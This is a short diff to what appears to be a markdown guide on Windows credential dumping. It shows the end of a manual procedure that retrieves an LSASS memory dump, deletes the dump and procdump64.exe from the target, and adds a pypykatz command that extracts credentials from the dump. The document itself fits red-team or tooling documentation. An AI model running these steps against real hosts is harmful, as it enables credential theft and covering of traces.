@@ -11,6 +11,8 @@ get lsass.dmp
 del lsass.dmp
 del procdump64.exe
 exit
+
+pypykatz lsa minidump lsass.dmp
 ```
 That's a very manual and time-consuming process when multiplied by many target hosts.
 
